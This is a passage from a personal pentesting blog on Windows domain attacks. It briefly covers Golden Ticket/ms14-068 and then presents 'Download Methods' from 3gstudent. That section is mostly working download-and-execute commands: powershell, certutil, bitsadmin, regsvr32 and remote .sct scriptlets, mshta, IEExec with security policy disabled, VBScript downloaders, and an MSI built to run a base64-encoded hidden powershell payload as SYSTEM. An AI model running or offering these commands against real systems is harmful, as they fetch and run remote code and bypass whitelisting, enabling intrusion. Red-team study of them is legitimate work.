<h3 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass the Ticket"></a>Pass the Ticket</h3><p>Tickets of every <code>Domain Member</code> are calculated using hash of <code>krbtgt</code> password, which is normally not changed.<br>If we control <code>krbtgt</code> or get its password, we can forge any member’s ticket, which is called <code>Golden Ticket</code>.<br>We can easily take over <code>Domain Controller</code> using <code>Domain Admin</code> password.</p>
<p>In windows <code>Domain</code> it is associated with <code>Kerberos</code>. Use msf and mimikatz to exploit with ms14-068.</p>
<h3 id="Download-Methods-from-3gstudent"><a href="#Download-Methods-from-3gstudent" class="headerlink" title="Download Methods (from 3gstudent)"></a>Download Methods (from <a class="link"   target="_blank" rel="noopener" href="https://github.com/3gstudent" >3gstudent<i class="fas fa-external-link-alt"></i></a>)</h3><p>From <code>cmd</code>:</p>
<ul>
<li>powershell<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;https://github.com/3gstudent/test/raw/master/putty.exe&#x27;</span>,<span class="string">&#x27;c:\download\a.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="string">&#x27;c:\download\a.exe&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>certutil<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> https://github.com/<span class="number">3</span>gstudent/test/raw/master/putty.exe c:\download\a.exe&amp;&amp;c:\download\a.exe</span><br></pre></td></tr></table></figure></li>
<li>bitsadmin (bit of slow)<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; bitsadmin /transfer n http://github.com/<span class="number">3</span>gstudent/test/raw/master/putty.exe c:\download\a.exe &amp;&amp; c:\download\a.exe</span><br></pre></td></tr></table></figure></li>
<li>regsvr32<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Route 1: regsvr32 -&gt; JScript -&gt; powershell -&gt; download &amp; exec</span></span><br><span class="line">&gt; regsvr32 /u /s /i:https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/downloadexec.sct scrobj.dll</span><br><span class="line"><span class="comment"># JScript call powershell to download &amp; execute by:</span></span><br><span class="line">&gt; new ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run(<span class="string">&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#x27;https://github.com/3gstudent/test/raw/master/putty.exe&#x27;,&#x27;c:\\download\\a.exe&#x27;);start-process &#x27;c:\\download\\a.exe&#x27;&quot;</span>,<span class="number">0</span>,true);</span><br><span class="line"><span class="comment"># sct file format can refer to:</span></span><br><span class="line">https://raw.githubusercontent.com/<span class="number">3</span>gstudent/SCTPersistence/master/calc.sct</span><br><span class="line"><span class="comment"># so the final payload:</span></span><br><span class="line">&gt; regsvr32 /u /s /i:https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/downloadexec.sct scrobj.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># Route 2: regsvr32 -&gt; VBScript -&gt; download&amp;exec</span></span><br><span class="line">&gt; regsvr32 /u /s /i:https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/downloadexec2.sct scrobj.dll</span><br><span class="line"><span class="comment"># VBScript download by:</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27; using Msxml2.XMLHTTP, cannot download https resources</span></span><br><span class="line"><span class="keyword">Const</span> adTypeBinary = <span class="number">1</span></span><br><span class="line"><span class="keyword">Const</span> adSaveCreateOverWrite = <span class="number">2</span></span><br><span class="line"><span class="keyword">Dim</span> http,ado</span><br><span class="line"><span class="keyword">Set</span> http = CreateObject(<span class="string">&quot;Msxml2.XMLHTTP&quot;</span>)</span><br><span class="line">http.open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.81.192/putty.exe&quot;</span>,<span class="literal">False</span></span><br><span class="line">http.send</span><br><span class="line"><span class="keyword">Set</span> ado = createobject(<span class="string">&quot;Adodb.Stream&quot;</span>)</span><br><span class="line">ado.Type = adTypeBinary</span><br><span class="line">ado.Open</span><br><span class="line">ado.Write http.responseBody</span><br><span class="line">ado.SaveToFile <span class="string">&quot;c:\download\a.exe&quot;</span></span><br><span class="line">ado.Close</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; using Msxml2.ServerXMLHTTP.6.0</span></span><br><span class="line"><span class="keyword">Const</span> adTypeBinary = <span class="number">1</span></span><br><span class="line"><span class="keyword">Const</span> adSaveCreateOverWrite = <span class="number">2</span></span><br><span class="line"><span class="keyword">Dim</span> http,ado</span><br><span class="line"><span class="keyword">Set</span> http = CreateObject(<span class="string">&quot;Msxml2.ServerXMLHTTP.6.0&quot;</span>)</span><br><span class="line">http.SetOption <span class="number">2</span>, <span class="number">13056</span></span><br><span class="line">http.open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;</span>,<span class="literal">False</span></span><br><span class="line">http.send</span><br><span class="line"><span class="keyword">Set</span> ado = createobject(<span class="string">&quot;Adodb.Stream&quot;</span>)</span><br><span class="line">ado.Type = adTypeBinary</span><br><span class="line">ado.Open</span><br><span class="line">ado.Write http.responseBody</span><br><span class="line">ado.SaveToFile <span class="string">&quot;c:\download\a.exe&quot;</span></span><br><span class="line">ado.Close</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; using WinHttp.WinHttpRequest.5.1</span></span><br><span class="line"><span class="keyword">Const</span> adTypeBinary = <span class="number">1</span></span><br><span class="line"><span class="keyword">Const</span> adSaveCreateOverWrite = <span class="number">2</span></span><br><span class="line"><span class="keyword">Dim</span> http,ado</span><br><span class="line"><span class="keyword">Set</span> http = CreateObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span><br><span class="line">http.open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;</span>,<span class="literal">False</span></span><br><span class="line">http.send</span><br><span class="line"><span class="keyword">Set</span> ado = createobject(<span class="string">&quot;Adodb.Stream&quot;</span>)</span><br><span class="line">ado.Type = adTypeBinary</span><br><span class="line">ado.Open</span><br><span class="line">ado.Write http.responseBody</span><br><span class="line">ado.SaveToFile <span class="string">&quot;c:\download\a.exe&quot;</span></span><br><span class="line">ado.Close</span><br></pre></td></tr></table></figure>
  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VBScript execute by:</span></span><br><span class="line">&gt; WScript.CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;c:\download\a.exe&quot;</span>,<span class="number">0</span>,true</span><br><span class="line"><span class="comment"># sct file format can refer to:</span></span><br><span class="line">https://raw.githubusercontent.com/<span class="number">3</span>gstudent/SCTPersistence/master/calc.sct</span><br><span class="line"><span class="comment"># and the final payload</span></span><br><span class="line">&gt; regsvr32 /u /s /i:https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/downloadexec2.sct scrobj.dll</span><br></pre></td></tr></table></figure></li>
<li>pubprn.vbs<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Route: regsvr32 -&gt; VBScript -&gt; download&amp;exec</span></span><br><span class="line">&gt; cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh<span class="literal">-CN</span>\pubprn.vbs <span class="number">127.0</span>.<span class="number">0.1</span> script:https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/downloadexec3.sct</span><br><span class="line"><span class="comment"># Route: regsvr32 -&gt; JScript -&gt; powershell -&gt; download&amp;exec</span></span><br></pre></td></tr></table></figure></li>
<li>msiexec<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># First, encode powershell command by using:</span></span><br><span class="line"><span class="variable">$fileContent</span> = <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;https://github.com/3gstudent/test/raw/master/putty.exe&#x27;,&#x27;c:\download\a.exe&#x27;);start-process &#x27;c:\download\a.exe&#x27;&quot;</span></span><br><span class="line"><span class="variable">$bytes</span>  = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$fileContent</span>);</span><br><span class="line"><span class="variable">$encoded</span> = [<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$bytes</span>); </span><br><span class="line"><span class="variable">$encoded</span></span><br><span class="line"><span class="comment"># get</span></span><br><span class="line">KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</span><br><span class="line"><span class="comment"># so we can execute by:</span></span><br><span class="line">&gt; powershell <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-enc</span> KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</span><br><span class="line"><span class="comment"># Second, fill it into a `wix` file:</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Wix</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/wix/2006/wi&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Product</span> <span class="attr">Id</span>=<span class="string">&quot;*&quot;</span> <span class="attr">UpgradeCode</span>=<span class="string">&quot;12345678-1234-1234-1234-111111111111&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example Product </span></span></span><br><span class="line"><span class="string"><span class="tag">Name&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;0.0.1&quot;</span> <span class="attr">Manufacturer</span>=<span class="string">&quot;@_xpn_&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;1033&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Package</span> <span class="attr">InstallerVersion</span>=<span class="string">&quot;200&quot;</span> <span class="attr">Compressed</span>=<span class="string">&quot;yes&quot;</span> <span class="attr">Comments</span>=<span class="string">&quot;Windows Installer Package&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Media</span> <span class="attr">Id</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;TARGETDIR&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;SourceDir&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;ProgramFilesFolder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;INSTALLLOCATION&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Component</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span> <span class="attr">Guid</span>=<span class="string">&quot;12345678-1234-1234-1234-222222222222&quot;</span>&gt;</span>     </span><br><span class="line">          <span class="tag">&lt;/<span class="name">Component</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Feature</span> <span class="attr">Id</span>=<span class="string">&quot;DefaultFeature&quot;</span> <span class="attr">Level</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ComponentRef</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Feature</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Id</span>=<span class="string">&quot;cmdline&quot;</span>&gt;</span>powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Directory</span>=<span class="string">&quot;TARGETDIR&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">ExeCommand</span>=<span class="string">&#x27;[cmdline]&#x27;</span> <span class="attr">Return</span>=<span class="string">&quot;ignore&quot;</span> <span class="attr">Impersonate</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Script</span>=<span class="string">&quot;vbscript&quot;</span> <span class="attr">Return</span>=<span class="string">&quot;check&quot;</span>&gt;</span></span><br><span class="line">      invalid vbs to fail install</span><br><span class="line">    <span class="tag">&lt;/<span class="name">CustomAction</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">After</span>=<span class="string">&quot;InstallInitialize&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Before</span>=<span class="string">&quot;InstallFiles&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Wix</span>&gt;</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Then compile it to `msi`</span></span><br><span class="line">&gt; candle.exe msigen.wix</span><br><span class="line">&gt; light.exe msigen.wixobj</span><br><span class="line"><span class="comment"># Finally achieve our target</span></span><br><span class="line">&gt; msiexec /q /i https://github.com/<span class="number">3</span>gstudent/test/raw/master/test.msi</span><br></pre></td></tr></table></figure></li>
<li>mshta<br><code>mshta</code> supports <code>http</code> &amp; <code>https</code>, parses <code>hta</code> scripts according to respones headers.<br>Only when receiving <code>html</code> header will <code>mshta</code> executes <code>hta</code> scripts. We will receive header as <code>text/plain</code> if:<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; mshta https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/calc.hta</span><br></pre></td></tr></table></figure>
  That’s because github codes are regarded as <code>text</code>, and it won’t execute. To regard it as <code>html</code>, try to upload it to github pages and:  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; mshta https://<span class="number">3</span>gstudent.github.io/test/calc.hta</span><br></pre></td></tr></table></figure>
  To achieve download and execution:  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># using vbs, but have to add https://3gstudent.github.io/ to trusted sites</span></span><br><span class="line">&gt; mshta https://<span class="number">3</span>gstudent.github.io/test/downloadexec.hta</span><br><span class="line"><span class="comment"># using powershell</span></span><br><span class="line">&gt; mshta https://<span class="number">3</span>gstudent.github.io/test/downloadexec2.hta</span><br><span class="line"><span class="comment"># to make it short</span></span><br><span class="line">&gt; mshta http://t.cn/RYUQyF8</span><br></pre></td></tr></table></figure></li>
<li>IEExec<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">cd</span> C:\Windows\Microsoft.NET\Framework\v2.<span class="number">0.50727</span>\</span><br><span class="line">&gt; caspol <span class="literal">-s</span> off</span><br><span class="line">&gt; IEExec http://github.com/<span class="number">3</span>gstudent/test/raw/master/putty.exe</span><br><span class="line"><span class="comment"># while the exe format should be special, refer to</span></span><br><span class="line">https://room362.com/post/<span class="number">2014</span>/<span class="number">2014</span><span class="literal">-01</span><span class="literal">-16</span><span class="literal">-application</span><span class="literal">-whitelist</span><span class="literal">-bypass</span><span class="literal">-using</span><span class="literal">-ieexec</span><span class="literal">-dot</span><span class="literal">-exe</span>/</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Pentest-framework"><a href="#Pentest-framework" class="headerlink" title="Pentest framework"></a>Pentest framework</h2><ul>
<li>Metasploit Framework (<a href="/2020/03/17/2020-03-17-MSF-Pentest-Route/">MSF-Pentest-Route</a>)</li>
<li>Cobalt Strike</li>
<li>Empire</li>
<li>NiShang</li>
<li>Powersploit</li>
<li>Immunity Canvas</li>
</ul>

            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/windows/">#windows</a>&nbsp;
                        </li>
                    
                        <li class="tag-item">
                            <a href="/tags/pentest/">#pentest</a>&nbsp;
                        </li>
                    
                        <li class="tag-item">
                            <a href="/tags/domain/">#domain</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2020/03/15/2020-03-15-About-Port-Forwarding/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">About Port Forwarding</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2020/03/05/2020-03-05-Learn-Symbolic-Execution-and-angr/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Learn Symbolic Execution and angr</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-Domain"><span class="nav-number">1.</span> <span class="nav-text">Windows Domain</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#What-is-it"><span class="nav-number">1.1.</span> <span class="nav-text">What is it?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#How-to-exploit"><span class="nav-number">1.2.</span> <span class="nav-text">How to exploit?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pentest-route"><span class="nav-number">1.3.</span> <span class="nav-text">Pentest route</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Additional-part"><span class="nav-number">1.4.</span> <span class="nav-text">Additional part</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Domain-Pentest-Technologies"><span class="nav-number">2.</span> <span class="nav-text">Domain Pentest Technologies</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Basic-Commands"><span class="nav-number">2.1.</span> <span class="nav-text">Basic Commands</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.2.</span> <span class="nav-text">Information Gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lateral-Movement"><span class="nav-number">2.3.</span> <span class="nav-text">Lateral Movement</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Port-Forwarding"><span class="nav-number">2.3.1.</span> <span class="nav-text">Port Forwarding</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IPC"><span class="nav-number">2.3.2.</span> <span class="nav-text">IPC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PsExec"><span class="nav-number">2.3.3.</span> <span class="nav-text">PsExec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WMI"><span class="nav-number">2.3.4.</span> <span class="nav-text">WMI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RDP"><span class="nav-number">2.3.5.</span> <span class="nav-text">RDP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tools"><span class="nav-number">2.3.6.</span> <span class="nav-text">Tools</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Penetration-Testing-Persistence"><span class="nav-number">2.4.</span> <span class="nav-text">Penetration Testing Persistence</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Methods"><span class="nav-number">2.4.1.</span> <span class="nav-text">Methods</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Useful-Directory"><span class="nav-number">2.4.2.</span> <span class="nav-text">Useful Directory</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tools-1"><span class="nav-number">2.4.3.</span> <span class="nav-text">Tools</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-number">2.5.</span> <span class="nav-text">Privilege Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Methods-1"><span class="nav-number">2.5.1.</span> <span class="nav-text">Methods</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tools-2"><span class="nav-number">2.5.2.</span> <span class="nav-text">Tools</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Steal-Credentials"><span class="nav-number">2.6.</span> <span class="nav-text">Steal Credentials</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Basic-Methods"><span class="nav-number">2.6.1.</span> <span class="nav-text">Basic Methods</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Simple-Examples"><span class="nav-number">2.6.2.</span> <span class="nav-text">Simple Examples</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploit-Hash"><span class="nav-number">2.6.3.</span> <span class="nav-text">Exploit Hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Tools-3"><span class="nav-number">2.6.4.</span> <span class="nav-text">Tools</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-the-Ticket"><span class="nav-number">2.7.</span> <span class="nav-text">Pass the Ticket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Download-Methods-from-3gstudent"><span class="nav-number">2.8.</span> <span class="nav-text">Download Methods (from 3gstudent)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pentest-framework"><span class="nav-number">3.</span> <span class="nav-text">Pentest framework</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2020</span> -
            
            2022
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">TyeYeah</a>
            
        </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
